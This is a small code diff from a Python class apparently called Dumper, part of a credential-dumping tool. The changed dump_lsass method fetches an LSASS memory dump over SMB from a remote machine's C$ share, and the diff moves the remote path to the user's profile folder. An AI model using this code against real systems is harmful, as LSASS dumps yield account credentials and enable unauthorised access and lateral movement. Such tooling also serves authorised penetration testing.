@@ -162,7 +162,11 @@ class Dumper:
 
     def dump_lsass(self):
         print("Dumping")
-        self.smb.getFile("C$", "/lsass_dump.dmp", open("lsass_dump.dmp", "wb").write)
+        self.smb.getFile(
+            "C$",
+            f"\\Users\\{self.credentials['username']}\\lsass_dump.dmp",
+            open("lsass_dump.dmp", "wb").write,
+        )
         print("Finished")
 
     def clear_out(self):
